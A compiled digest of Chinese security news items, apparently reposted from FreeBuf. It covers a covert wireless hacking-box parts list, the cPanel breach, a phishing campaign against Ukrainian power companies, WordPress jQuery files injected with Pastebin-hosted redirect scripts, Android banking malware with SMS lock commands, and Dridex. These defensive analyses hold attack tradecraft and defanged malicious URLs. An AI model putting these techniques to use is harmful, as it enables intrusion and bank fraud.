+RPi TFT显示屏以及FONA GSM模块
+NooElec DVB-T SDR (R820T2)
+beaglebone black或者RPi2
+Ubertooth One（开源无线蓝牙开发平台）
+Hak5 Pineapple Mark V （目前已经停产）
+ALFA AWUS036NHA (AR9271) 网卡或其它
+TP-Link M5350
+ 
+=700) window.open('https://bbs.2cto.com/file:///C:/Users/WEIZH0~1/AppData/Local/Temp/msohtmlclip1/01/clip_image005.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+天线的选择
+这取决于你自己的实际情况，但是出于隐蔽性的考虑，我不推荐超过300mm 的天线，对于是否使用固定天线，这点并不是很重要，而且这一点主要取决于你自己的想法。
+=700) window.open('https://bbs.2cto.com/file:///C:/Users/WEIZH0~1/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+=700) window.open('https://bbs.2cto.com/file:///C:/Users/WEIZH0~1/AppData/Local/Temp/msohtmlclip1/01/clip_image007.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+设备的安装与配置
+如何配置以及使用这个设备已经超出了本博客的介绍范围，上面介绍只是提供了可行方案，网上有许多好的指导网站，可以帮助你完成配置与使用。
+结论
+建造一个这样的箱子其中过程是非常有趣的，同时我希望这个博文可以帮助你建造属于自己的箱子。
+*参考来源：gerzic
+ 
+
+
+
+
+-----------------------------------------------------------16-----------------------------------------------------------
+0X16: 
+     [2.2]Kali 2.0安装与使用指南 
+
+=700) window.open('https://bbs.2cto.com/file:///C:/Users/WEIZH0~1/AppData/Local/Temp/msohtmlclip1/01/clip_image001.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+=700) window.open('http://image.3001.net/images/20160130/14540858194014.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+
+-----------------------------------------------------------17-----------------------------------------------------------
+0X17: 
+     [2.2]领跑全球安全行业，为什么是以色列？ 
+
+=700) window.open('http://image.3001.net/images/20160129/1454048808685.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+2008年，时任PayPal总裁的斯科特・汤普森会见了一个声称能解决在线支付欺诈问题的以色列年轻人，听起来就像是天方夜谭，年轻人平静地说：“我们的想法很简单。我相信这个世界上只有两种人，好人和坏人。打击欺诈的办法就是在网络上把这两种人区分开来。”
+
+这位年轻人来自一家以色列安全公司Fraud Sciences，公司致力于提供反欺诈检测服务。
+Fraud Sciences分析了汤普森提供的10万个PayPal交易记录作为“测试”，几个月后他们交出了令人震惊的答卷：这家仅有五十人的以色列公司得到的分析结果竟比PayPal的精确17%！他们用了相对少的数据，却更加准确地预测分辨出谁是好顾客或坏顾客。
+后来广为人知的事情是PayPal以1.69亿美元收购了这家成立仅五年的以色列安全公司。
+这仅仅是个开始，以色列安全行业的风帆刚刚扬起，硅谷会是下一个港湾吗？
+
+
+“弹丸之国”以色列领跑全球安全行业
+
+
+=700) window.open('http://image.3001.net/images/20160129/14540490806332.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+有800万人口的以色列，国土面积与我国湖南省差不多，作为世界上唯一以犹太人为主体的国家，以色列素来逃不了“是非之地”的命运。然而，以色列还被誉为“中东硅谷”，目前以色列拥有超过300家网络安全公司，更是缔造了仅次于美国的全球第二大安全产业规模。
+以色列实力强大的网络安全行业非三言两语能够概括的，我们先来看看几组数据：
+
+
+2014年以色列网络安全企业的出口总值就达到60亿美元，大约占去了全球网安市场的10%。
+2015年，以色列安全行业呈现出雨后春笋般的增长势头，新成立的安全初创公司多达81家，安全行业规模更是较2014年增长了25%。如果这样还不足以说明以色列网络安全公司的实力，我们再来看下他们在2015年的掘金之旅：
+
+致力于培养网络安全公司的以色列风投机构Team8在第一轮融资中就得到1800万美元；
+移动安全公司Skycure成立仅一个月，融资1100万美元；
+聚焦车联网安全的初创企业Argus Cyber Security在B轮获得2600万美元融资；
+主攻大数据与威胁情报的网络入侵检测公司Cybereason获得了软银集团5000万美元融资；
+网络安全公司Illusive networks三个月内完成A轮、B轮融资，总额达到2700万美元。
+全球“科技圣地”硅谷也不甘示弱，屡次抛出橄榄枝：
+
+
+PayPal以传言中的至少600万美元收购成立仅一年的以色列网安公司CyActive；
+黑莓则收下了以色列文件安全与数据版权管理初创公司WatchDox，传闻价格为1到1.5亿；
+微软收购了云安全服务商Adallom，而另一家安全公司Secure Islands则成为被微软收购的第三家以色列安全公司，收购金额都上亿、具体不详。
+
+
+为什么以色列安全公司得以崭露头角？
+
+
+“犹太人最大的传统就是不满足，这对于政治来说或许不是好事，但对于科学来说绝对是好事。”――以色列前总统西蒙・佩雷斯
+
+
+
+-----------------------------------------------------------18-----------------------------------------------------------
+0X18: 
+     [2.2]虚拟主机管理公司cPanel被黑，用户数据泄露 
+
+=700) window.open('http://image.3001.net/images/20160128/14539701096733.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+近日，虚拟主机管理公司cPanel承认被黑，已通知用户其信息或已被泄露。
+
+
+
+FreeBuf百科：cPanel
+
+cPanel虚拟主机管理系统可以让您的网站和服务器管理更加简单，它成功克服了Linux操作系统图像化界面不够优秀的缺点，给您提供一个非常友好的功能强大的界面。您可以通过简单的图形界面轻松管理您的服务器和服务器上的网站，而不必再为记忆大量的、繁琐的Linux命令而头疼。
+由于之前发生的一系列事件，客户的姓名、联系方式、加密密码等已被泄露。幸好支付信息是储存在令一个单独的系统上，没有泄露，目前仍是安全的。
+
+
+cPanel承认数据库被入侵
+
+cPanel正在紧急强制使用旧密码加密方式的用户更改密码。cPanel也于上周末向用户发去邮件，邮件中指出：
+
+“我们正式通知各位用户，我们其中一个用户数据库遭到黑客入侵，信息已被泄露。尽管我们已经成功中断了这次入侵，但是用户的联系信息仍然有可能已被泄露。”
+“用户的联系信息或许已被泄露，但是信息仅限姓名、联系方式、加密（加盐）密码。请确知我们的信用卡信息是存储在一个单独的系统上，并不受这次黑客事件的影响。尽管当前的密码存储时已被加盐和加密，但是经历这次事件，我们正在努力的加强密码加密，以使危害减至最小。为了保护系统安全，我们强制使用旧密码加密方式的用户更改他们的密码。”* 参考来源：theregister
+
+
+
+
+
+
+
+-----------------------------------------------------------19-----------------------------------------------------------
+0X19: 
+     [2.2]乌克兰电网攻击第二季 
+
+一波未平，一波又起。2015年12月23日发生的由木马攻击引起的乌克兰电网电力中断，这是首次由恶意软件攻击导致国家基础设施瘫痪的事件，致使乌克兰城市伊万诺弗兰科夫斯克将近一半的家庭（约140万人）在2015年圣诞节前夕经历了数小时的电力瘫痪。这次事件使得工业控制系统的安全性问题受到重视。
+微步在线近日捕获的威胁信息表明：新的一波攻击已经悄然开始，这次的攻击对象是乌克兰多家电力公司。攻击者伪装成乌克兰国家电力公司定向发送精心伪装的钓鱼邮件，且此次使用的木马并非臭名昭著BlackEnergy。
+
+
+一、攻击过程及方式
+
+2016年1月19日下午乌克兰当地时间16:51和16:56分，两封号称从: “Ukrenergo”发送至ikc@obl.ck.energy.gov.ua和sp@rdc.centre.energy.gov.ua的电子邮件拉开了攻击序幕。攻击邮件来自时区 (UTC -08：00)，攻击者伪装成来自乌克兰国有电力公司UKrenergo，攻击对象分别为切尔卡瑟地区电力公司Cherkasyoblenergo的信息咨询处，和Ukrenergo下属机构Central Energy System of SE的Kondrashov Alexander，后者的职务是分站主任（Chief of substationsof Central ES )
+微步在线分析发现，此次是采用通过发送钓鱼邮件的传统方式进行攻击。即在邮件中加入一个名为Ocenka.xls的恶意Excel文件为附件，并在该文件中植入恶意宏代码。
+=700) window.open('http://image.3001.net/images/20160131/14542150018613.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+邮件包含一个托管在远程服务器62.210.83.213上的 PNG文件，用于报告电子邮件传递状态。
+=700) window.open('http://image.3001.net/images/20160131/14542150102254.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+邮件正文内容是乌克兰文：
+=700) window.open('http://image.3001.net/images/20160131/14542150277095.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+内容大致翻译如下：
+
+“根据乌克兰法律”运营乌克兰电力市场的原则“以及”未来十年乌克兰联合能源系统的订单准备系统运营商发展计划“，经乌克兰煤炭工业能源部批准的No.680 20140929系统运营商，在其官方网站发布。主题是：“乌克兰2016年至2025年联合能源系统发展规划”。发展规划具体内容草案在邮件附件中：
+
+“根据预备流程的第五章规定，将于2016年1月20日下午2点在750 kV基辅会议室（基辅区、马卡罗夫区、体育nalyvaykivka圣十月，112-B）将举行听证会，对发展计划的征求意见稿进行意见反馈。”点击附件是一个Excel文件，打开信息如下：
+=700) window.open('http://image.3001.net/images/20160131/14542150509718.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+在线翻译大致内容如下：
+发电量评估和优化的必要性
+
+
+
+-----------------------------------------------------------20-----------------------------------------------------------
+0X20: 
+     [2.2]安卓提权漏洞分析（CVE-2014-7920、CVE-2014-7921） 
+
+近日，安全专家发现两个安卓漏洞，若两者结合使用，就可以在mediaserver进程中执行任意代码，且没有任何权限要求。
+=700) window.open('http://image.3001.net/images/20160127/14538764867978.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+漏洞影响
+第一个漏洞(CVE-2014-7921)影响Android 4.0.3以上版本，第二个漏洞(CVE-2014-7920)影响Android 2.2以上版本，且二者均不会局限于特定厂商，而是影响所有安卓设备。前一个漏洞只需要让ASLR保护，而该机制应用于Android 4.1以上版本，因此这些漏洞可以在Android 2.2以上版本的设备中的mediaserver进程中执行任意代码。
+尽管这两个漏洞在2014年10月中旬曝光，却是在Android 5.1版本中最终修复，这就意味着仍然有很多安卓设备受到影响。
+补丁获取链接：googlesource
+漏洞利用
+Mediaserver进程负责所有与媒体相关的任务，为了服务与不同的媒体相关类请求，该进程公开使用大量功能，主要分为以下四类：
+1、media.audio_policy：处理音频相关信息，例如不同音频流的数据卷；2、media.audio_flinger：媒体相关任务的主要配置端，例如录制音频，将手机设为静音状态；3、media.camera：允许与设备的相机进行交互；4、media.player：允许多种不同媒体格式的回放。例如使用stagefright库。[/url]
+
+
+
+-----------------------------------------------------------21-----------------------------------------------------------
+0X21: 
+     [1.29]辟谣：以色列电网躺枪，被黑的是电力局 
+
+昨天有多家媒体曝出以色列电网被黑客攻击，由此让大众联想上个月乌克兰电网被黑，致使将近70万民众遭受停电困扰的重大事件。但事实却并非如此，微步在线（Treatbook）根据已有的线索和报道，确认此次被攻破的是以色列国家电力局，而非国家电网系统。
+
+
+“以色列国家电网遭受最大规模网络攻击”系媒体误导
+
+Dragos Security的CEO Robert Lee在SANS 工控系统安全博客中指出，此次攻击是常见的通过邮件传播勒索软件(Ransomware)，而非针对工业控制系统的木马。被攻击的对象是以色列国家电力局网络，该单位共有大约30名工作人员。
+一位以色列网络空间分析师（EyalSela)已在第一时间与Robert Lee取得联系，指出一些媒体报道的“以色列国家电网遭受有史最大规模网络攻击”存在误导，此次攻击与以色列电力企业、传输或者供电站网络并无直接关联。
+
+
+实际上是以色列电力局受到攻击
+
+事情的起因是：以色列国家基础设施，能源和水资源部部长Yuval Steinitz在2016届特拉维夫Cybertech大会上表示，以色列国家电力局正在遭受着严重的网络攻击，还指出这是基础设施遭受网络攻击的一个活生生的例子。而这些信息被媒体误读为伊朗国家电网遭受了网络攻击。
+据推断是通过发送钓鱼邮件诱骗收件人执行恶意代码，加密电脑中相关内容，需要受害人付款才能解锁。以色列当局也迅速采取了措施，将受感染电脑断网来防止勒索软件在网络中进一步传播。据Yuval Steinitz称，目前病毒已经被识别，并且已找到对付它的方法。
+在过去的两年中，以色列已遭受过多次网络攻击。以色列官方认为背后进行渗透尝试的黑客与真主党和伊朗政府有关。
+
+
+相关链接
+
+SANS工控系统安全博客：https://ics.sans.org/blog/2016/01/27/context-for-the-claim-of-a-cyber-attack-on-the-israeli-electric-grid
+相关报道：http://www.computerworld.com/article/3026609/security/no-israels-power-grid-wasnt-hacked-but-ransomware-hit-israels-electric-authority.html
+以色列当地媒体报道(希伯来语)：http://www.yediot.co.il/articles/0,7340,L-4758366,00.html
+*本文作者：Threatbook(微步在线) 是国内首家专注于安全威胁情报的创业公司，转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）
+
+
+
+
+
+
+
+-----------------------------------------------------------22-----------------------------------------------------------
+0X22: 
+     [1.29]Pastebin Hacking新姿势：使用jQuery替换进行恶意软件传播 
+
+=700) window.open('http://image.3001.net/images/20160124/1453564879645.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+随着各种网络技术不断发展，黑客对于网站攻击也总是不断变换策略以及通过互相之间的交流来改进攻击技术。而事实上就目前网站安全方面，面临的挑战主要也正是来自于攻击技术不断的演进，使得防御也需不断升级。在之前也发布过《恶意软件新玩法：隐匿在Pastebin上的后门》，而这一次，我们将展示一种新的攻击方法，是通过结合上述的技术，使用伪造的jquery Pastebin文件来进行恶意软件传播。
+
+FreeBuf百科：Pastebin
+
+Pastebin，官网地址为http://pastebin.com，在PasteBin上的可以将代码、文本进行粘贴并存储好，比如在Paste文本框内贴好文本、代码，并选择类型，比如截图中的css，再点击submit，就会自动上传并获得分享地址。通过这种方式，我们可以很好地进行代码或者其他文本的分享。
+
+
+恶意链接的发现
+
+早在几个星期之前，SuCuri安全团队通过SiteCheck开始检测扫描WordPress的站点，但在通过逆向分析某个WordPress网站的/wp-includes/js/jquery/jquery.js以及/wp-includes/js/jquery/jquery-migrate.min.js文件中的JavaScript代码时发现，出现某些不属于原始文件的代码，我们可以在下面检测到受感染的jquery文件的截图中看到，相应的URL其实是被写在 payload里面的。
+=700) window.open('http://image.3001.net/images/20160124/14535655372690.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+从上面的分析结果来看（其中 war/moc.nibetsap//:ptth反过来过来的网址是http://pastebin.com/raw），上述的两个文件被注入了从 Pastebin加载进来的恶意脚本。在之前，我们在infected Magento sites的案例中也有了解到类似的攻击方式。那么，从某种程度上来说，这两个攻击案例是相关联的。不过，这个WordPress的感染方式更加有趣，所以也让我们仔细看看先前检测到的Pastebin链接。
+
+
+成对出现的Paste
+
+jquery.js 和 jquery-migrate.min.js这两个文件是WordPress的核心文件。一般来说，黑客在获得访问网站的访问权限后，有时会选择将上述文件的内容替换成恶意代码，实现跨站攻击。
+在这个案例中，我们可以发现，
+1、攻击者向 jquery.js文件嵌入的恶意脚本是从以下网址加载的（成对出现），
+hxxp://pastebin .com/raw/HC90NJsphxxp://pastebin .com/raw/dWe3gcb5 (or hxxp://pastebin .com/sE8cX1Pi)2、向jquery-migrate.min.js文件嵌入的恶意脚本则是通过以下网址加载的，
+hxxp://pastebin .com/raw/WMMc4sS8hxxp://pastebin .com/raw/rDiH4Bjy现在我们对于这些成对的Pastebin链接可能会产生一些问题。
+1、为什么攻击者会注入两个脚本？2、为什么攻击者会将合法代码从WordPress的核心文件中移除？3、它不会对被感染的网站造成破坏么？以上的问题我们将在下面通过分析来找到答案。
+
+
+链接中的 Pastebin内容
+
+让我们先剖析下每对 Pastebin链接的内容，
+HC90NJsp 实际上是jQuery (v1.11.3)的原始源码，它相对应的链接，dWe3gcb5却是一个恶意脚本，会将访问者重定向到hxxps://goo .gl/54Miz5同样的， WMMc4sS8是 jQuery Migrate库的原始脚本，它相对应的链接rDiH4Bjy也是一个恶意脚本，会将访问者重定向到hxxps://goo .gl/54Miz5或者 hxxp://get .adobe.com .flashplayer .frogsland .com/flashplayer_20ga/上那现在我们了解了，在此案例中，黑客获取访问权限后，会将jQuery库文件移除，而在每一个感染 WordPress jQuery文件的脚本中，第一个感染的Pastebin脚本是用于补充此前移除的 jQuery原始代码，而第二个脚本则用于植入恶意程序。
+目前尚不清楚为何攻击者要先移除现有的代码，再从Pastebin加载进去。比较有可能的是，这样会使得恶意程序的感染以及二次感染更容易。攻击者在实施攻击时还是需要检查是否 .js文件已经感染成功，而通过将全部代码都更换，来确保恶意程序的成功感染。因为jQuery代码被嵌入到攻击的脚本中的话，会导致攻击脚本会相当长，所以攻击者想到了通过将 jQuery库文件保存在 Pastebin上，然后只提供一个额外的调用。
+
+
+Pastebin用户信息
+
+经过对pastebin上的paste内容的追踪，我们发现，上述调用的paste所属的用户并不是匿名的，有两个用户是跟它有关联的。
+Emonostin �资料显示该用户创建于2015年12月2日Jstoolshope � 资料显示该用户则创建于2015年12月17日再经过研究发现，两个用户都只有两个paste， 而其中Emonostin的pastes是用于加载到 jquery-migrate.min.js文件中，而Jstoolshope的pastes是用于加载到 jquery.js文件的。
+那么到这里，我们也会产生疑问，为什么攻击者会选择使用经过注册的用户账户来进行文件的加载。首先，因为这样会显得更灵活，攻击者可以针对自己的pastes内容进行随时更换。比如，如果黑客需要重定向URL，那么就可以直接在paste里面的代码做。下图为恶意程序在pastebin.com上的修改时间，
+=700) window.open('http://image.3001.net/images/20160124/14535672954372.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+其实在Pastebin上，针对每一个paste 也提供了关于浏览次数的统计信息。我们看到，jquery.js 的两个paste的浏览次数均为20,000+，而 jquery-migrate.min.js的两个相关的paste则有接近 40,000的浏览量。乍一看，这种情况似乎又很合乎逻辑，上述提到的两个成对的paste浏览量都是接近的。到这里，我们也会猜测，是不是植入恶意程序的.js脚本在paste有浏览记录的同时也会被下载。但是，从 pastebin FAQ社区的回复说，关于Pastebin上paste的浏览统计量，并不仅仅只是针对paste下载的次数。所以从Pastebin的计数数据来看，并不能准确评估攻击的次数。但为了获取更加可靠的统计数据，我们可以看goo.gl的重定向情况。
+
+
+恶意代码
+
+
+现在让我们看回恶意代码，经过具体的分析，我们发现它会检查 “tmid_no_session”（在一个版本中）以及“tmid_no_check”（另外一个版本） cookie 的状态。如果 cookie中的状态是设置为“1”，那么则不会返回信息给到访问者。但接着脚本会将cookie状态设置为“3”，并将访问者重定向到第三方网址。
+在本案例中，在jquery-migrate.min.js 的恶意脚本会将Windows用户重定向到hxxp://get .adobe .com .flashplayer .frogsland .com/flashplayer_20ga/，其它系统用户则重定向到hxxps://goo .gl/54Miz5。而jquery.js中的恶意脚本则将Windows系统和非Windows系统的用户重定向到hxxps://goo .gl/54Miz5。
+而Windows重定向的URL是伪造的。我们可以看到其被伪装成Flash player的升级页面。但其实该网址已经被Google列入钓鱼网站的黑名单中了。
+=700) window.open('http://image.3001.net/images/20160124/14535679326052.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+以下链接是VirusTotal针对该网址提供升级并下载的恶意程序的分析报告，大家有兴趣可以看看。
+VirusTotal链接
+
+
+恶意广告的植入
+
+另外一个重定向网址“hxxps://goo .gl/54Miz5”，则指向“hxxps://go .padsdel .com/afu.php?id=473791“。这是一个隶属于广告联盟的网址。
+从实际情况来看，将访问流量从被攻击的网站重定向到广告联盟链接是2015年较为常用的攻击方式。而我们也看到越来越多的攻击者从中获利。攻击者一般在此类攻击中将广告联盟链接嵌入其中，并利用这种方式从广告商那里获利。这些广告商往往愿意出价的原因是通过重定向的网站，诱骗访问者去安装恶意软件和垃圾软件（UWS）。而这些恶意软件可以劫持浏览器，用以显示更多的垃圾和恶意广告。（这看起来似乎像是一个递归的恶意广告投入模式）
+广告和恶意软件一般都是并行的，在本次“jquery pastebin”攻击案例中，攻击者有两种操作模式：一个是针对垃圾广告，另外一个是针对恶意软件。而这种模式也逐渐在黑市中形成“盈利”产业链条。
+
+
+Goo.gl链接统计
+
+Goo.gl链接一般都较为明显，我们可以看到任意短链接的使用统计数量。比如，以下是重定向的网址 https://goo.gl/#analytics/goo.gl/54Miz5/month的使用数据。
+=700) window.open('http://image.3001.net/images/20160124/14535681994258.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+我们可以看到攻击者开始使用重定向网址”hxxps://goo .gl/54Miz5” 是在12月15日。经过对其监测，该网址平均每天有接近1万的访问量（即重定向次数），而在12月29日则到达顶峰，有超过3万访问量。这些数字同时也代表了被重定向的访问者的数量，因为恶意软件通过cookie设置不会对已知的访问者进行重定向。
+
+
+防护措施
+
+从影响来看，这种攻击会比较令人头疼。而一种相对麻烦的解决方式是对.js文件中的恶意代码进行清除，但这样做却是存在可能会因为不小心清空代码造成网站不可用的风险，所以如果采用这种方法还请注意。
+另外一种较为容易的解决方式是：
+1、利用最近备份的副本恢复到原先的版本及状态；2、升级或者重装WordPress；3、对感染的.js文件进行修复，用户可以在以下地址中获取标准版本，（针对WordPress 4.4）http://core.svn.wordpress.org/tags/4.4/wp-includes/js/jquery/jquery.js
+http://core.svn.wordpress.org/tags/4.4/wp-includes/js/jquery/jquery-migrate.min.js
+与此同时，仅仅只是清除恶意代码对于网站的安全保障来说还是不够的，用户最好能够全面扫描下服务器，检查是否存在后门，并修补发现的安全漏洞。同时，在平时应该利用工具或者其他方式，对网站进行实时监控，确保能在攻击发生时，管理员可以及时作出反应。
+* 参考来源：sucuri
+
+
+
+
+
+
+
+-----------------------------------------------------------23-----------------------------------------------------------
+0X23: 
+     [1.29]Operation Emmental：攻击移动银行用户的犯罪行动 
+
+=700) window.open('http://image.3001.net/images/20160126/1453773352167.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+想像一下这样一个情景：你的“银行”来了一个通知，给你一个链接让你下载并更新你的手机应用。下载了应用后，它会向你请求获取管理权限。
+通知里会提到这一点，但你还是很痛快地点了允许。该应用能正常运行，还能进行正常的交易。但是第二天，你会发现你的手机打不开了，解锁屏幕的密码一直错误。这时你并不知道发生了什么事，因为手机一直在手里，没有借给熊孩子，也没有被隔壁老王顺走。然而你无论怎么尝试破解密码，就是解锁不了。然而就在你花了一整天时间去解锁手机时，已经有人将你的银行账户清空了。
+2014年，我们发现名为Operation Emmental的犯罪行动，行动中的恶意软件专门拦截短信，劫持用户的手机银行。最近，我们研究人员就遇到了上述类型的恶意应用，它还允许黑客远程发出命令，通过短信重置用户密码。该应用可以暂时锁定用户设备的主屏，拖延用户开锁的时间，黑客可以在此期间攫取用户银行里的金钱。
+伪装成OTP生成器
+类似于前面Operation Emmental里的应用，最近有新的版本的假冒银行应用，它能生成一次性密码（OTP）。我们已经检测到了伪装成奥地利银行官方应用的样本：
+=700) window.open('http://image.3001.net/images/20160126/14537724438350.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+事实上，所谓的随机一次性密码，只是从一个静态的列表里随机选择的。一旦恶意软件被激活，它会静默定期运行以下任务：
+下载并解析配置文件检查并确保CC服务器预设URL是可用的，在中毒的手机和远程黑客之间，通过BlowFish算法进行通信将存储的短信发送出去恶意软件会在用户不知情的情况下，访问特定的URL或者联系特定的电话号码。根据黑客的偏好，恶意应用会实时通过短信发送消息给黑客，或者通过互联网选择延时发送。这些URL或者号码存储在一个配置文件MainPref.xml里，黑客可以随时操作配置里面的内容：
+
+
+=700) window.open('http://image.3001.net/images/20160126/14537725657270.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+运行时，下面的URL都是带USE_前缀的：
+=700) window.open('http://image.3001.net/images/20160126/14537721451477.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+=700) window.open('http://image.3001.net/images/20160126/14537721678489.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+USE_URL_MAIN 获取配置的源
+USE_URL_SMS 除了拦截发送给用户的消息，这个恶意软件也能够通过短信接收命令。当手机收到短信时，恶意应用会检查是否能控制命令。比如“LOCK”，会重置用户的锁屏密码，黑客可以远程实时重新配置。设备管理API目前只支持字母数字的密码。记住，如果一个应用试图取得管理权限，你就应该开始怀疑该应用的合法性了。
+一旦黑客修改了密码，受感染的手机可能在一定时间内不能使用。黑客可以用“UNLOCK”轻松解锁，然后再随时重新锁上手机屏。
+黑客可以锁定一个受害者的手机，让他们在不知觉中转走受害者银行账户里的钱，而收不到银行来的提醒。
+=700) window.open('http://image.3001.net/images/20160126/14537722513608.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+黑客会利用热门网站名字作为简写的命令，GOOGL表示设置拦截发送的短信，GOOGLE会删除手机号，停止拦截短信。YAHOO会设置CC的URL，开始发送拦截的短信：
+=700) window.open('http://image.3001.net/images/20160126/145377231766.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+=700) window.open('http://image.3001.net/images/20160126/14537723453046.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+因为黑客可以远程推送字符串到受害者的移动设备上，所以我们建议用户及时备份。用户应该在设备上安装安全软件，以便及时检测这些恶意程序。
+URL和相关的SHA1 hash附录，请戳这里。
+*参考来源：趋势
+
+
+
+
+
+
+
+
+
+-----------------------------------------------------------24-----------------------------------------------------------
+0X24: 
+     [1.29]Dridex出现新型变种木马，专攻英国银行客户 
+
+=700) window.open('http://image.3001.net/images/20160122/14534612532690.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+根据IBM X-Force团队安全专家们的消息，他们发现了一波通过Andromeda僵尸网络传播的新型恶意活动。这是一种基于Dridex木马的攻击，主要目标是英国银行企业的客户，目的是窃取他们的身份验证码。
+
+
+Dridex网银木马又出新变种
+
+对于银行来说，Dridex网银木马是最为严重的威胁之一。近期，Evil Corp（Evil公司）发布了一款Dridex网银木马的新变种，该变种已经通过Andromeda僵尸网络在互联网上进行传播。新变种的Dridex网银木马的主要攻击目标是富有的英国银行客户。
+IBM网络安全研究者Limor Kessem陈述道：
+“Dridex最近出现了一款新型变种，修复了一些内部bug。新版本恶意软件的版本号为V196769（即v.3.161），它于2016年1月6日首次被发现。这款新型变种发布后，立即被一场恶意感染活动所传播，该感染活动利用Andromeda僵尸网络将它传播到潜在受害者电脑上。值得一提的是，这场恶意活动的主要攻击目标是英国银行客户。”
+
+攻击流程分析
+
+
+在这场新型恶意活动中，受害者会接收到一封垃圾邮件，其中包含一个微软Office文件的附件，邮件中声称此附件为一个发票文件。事实上，这个附件中包含一个恶意宏；且一旦被启动，就会开启感染进程：首先将Dridex植入到目标电脑上，然后在用户正常访问银行合法网站时，将其重定向到恶意网站上。
+=700) window.open('http://image.3001.net/images/20160122/14534615071302.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+在对重定向机制进行详细分析后，X-Force研究人员们将新型的Dridex感染重定向攻击与Dyre木马的重定向攻击方案进行了对比，两者之间唯一的不同点是：Dyre通过一个本地代理进行重定向，而Dridex是通过本地DNS中毒进行重定向。这种攻击方案的目的是诱导受害者泄露身份验证码。
+
+
+仍旧处于不断更新之中
+
+根据专家们的消息，Dridex木马在感染用户的数量上和质量上都有所提高，所针对的银行数量也在逐步增加，并且其代码更加复杂，功能也在不断的更新。
+*参考来源：SecurityAffairs
+
+
+
+
+
+
+
+
